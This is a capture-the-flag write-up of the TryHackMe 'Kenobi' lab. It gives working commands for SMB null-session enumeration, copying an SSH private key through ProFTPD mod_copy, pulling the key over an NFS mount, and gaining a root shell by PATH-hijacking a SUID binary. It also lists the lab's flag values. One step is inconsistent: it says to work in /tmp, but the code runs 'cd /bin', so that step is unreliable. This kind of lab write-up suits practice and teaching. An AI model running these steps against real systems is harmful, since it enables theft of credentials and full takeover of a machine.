# CTF: Kenobi (THM)

## Metadata

- **Target IP:** 10.48.148.231
    
- **OS:** Ubuntu 20.04 LTS
    
- **Difficulty:** Easy
    
- **Date:** 2026-02-26
    
- **Key Skills/Tools:** Nmap, SMB Enumeration, ProFTPD `mod_copy` exploitation, NFS Mounting, SUID Path Hijacking.
    

---

## Reconnaissance

### Port Scanning

A comprehensive Nmap scan revealed a target heavily loaded with networked file-sharing services (SMB, NFS, and FTP).

Bash

```
nmap -Pn $target -sV -sC
```

**Key Ports:**

- **21/tcp:** ProFTPD 1.3.5
    
- **22/tcp:** OpenSSH 8.2p1
    
- **80/tcp:** Apache 2.4.41
    
- **111/tcp:** rpcbind (Essential for NFS)
    
- **139/445/tcp:** Samba (SMB)
    
- **2049/tcp:** NFS (Network File System)
    

### SMB Enumeration

Using `netexec`, I discovered **Null Authentication** was enabled, allowing access to an `anonymous` share.

Bash

```
netexec smb $target -u 'guest' -p '' --shares
```

Inside the share, I found `log.txt`, which contained information about the ProFTPD configuration and the user **kenobi**, including hints about the location of his SSH private key.

---

## Credential Cracking

_No password cracking was necessary for this machine. Access was gained by stealing an SSH private key using a service vulnerability._

---

## Foothold

### ProFTPD `mod_copy` Exploitation

The target is running **ProFTPD 1.3.5**, which is vulnerable to the `mod_copy` module exploit. This allows an unauthenticated user to copy files from one location on the server to another using the `SITE CPFR` (Copy From) and `SITE CPTO` (Copy To) commands.

Since I knew Kenobi’s SSH key was located at `/home/kenobi/.ssh/id_rsa`, I moved it to a directory I could access via the NFS share (`/var/tmp`).

Bash

```
nc $target 21
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
```

### NFS Mounting

The Nmap scan showed that `/var` was an exportable mount point via NFS. I mounted the target's `/var` directory to my local machine to retrieve the stolen key.

Bash

```
mkdir nfs
sudo mount $target:/var nfs
cp nfs/tmp/id_rsa .
chmod 600 id_rsa
```

### SSH Access

With the private key in hand, I logged in as **kenobi**.

Bash

```
ssh -i id_rsa kenobi@$target
```

---

## Lateral Movement

_Lateral movement was unnecessary as the target only had one primary user before reaching root._

---

## Privilege Escalation

### SUID Path Hijacking

I searched for SUID binaries and found a non-standard entry: `/usr/bin/menu`.

Bash

```
find / -perm -u=s -type f 2>/dev/null
```

Running strings on `/usr/bin/menu` showed that it calls the system command `curl` without using an absolute path (e.g., it calls `curl` instead of `/usr/bin/curl`).

By creating a malicious `curl` file in a writable directory, adding that directory to the front of my `PATH`, and running the SUID binary, I was able to hijack the execution flow to launch a root shell.

**Exploit Steps:**

1. Navigate to `/tmp` (or Kenobi's `bin` folder).
    
2. Create a file named `curl` containing `/bin/sh`.
    
3. Make it executable.
    
4. Prepend the current directory to the `$PATH`.
    
5. Execute the SUID binary.
    

Bash

```
cd /bin
echo "/bin/sh" > curl
chmod +x curl
export PATH=/tmp:$PATH
/usr/bin/menu
# (Select option 1)
```

**Result:** The binary executed my fake `curl` as the root user, granting me a root shell.

---

## Flags

|**Flag Type**|**Value**|
|---|---|
|**User**|d0b0f3f53b6caa532a83915e19224899|
|**Root**|177b3cd8562289f37382721c28381f02|

---

That Path Hijacking trick is a great reminder that if you’re a dev, you should _always_ use absolute paths in system calls. "Hello there" indeed, root shell.
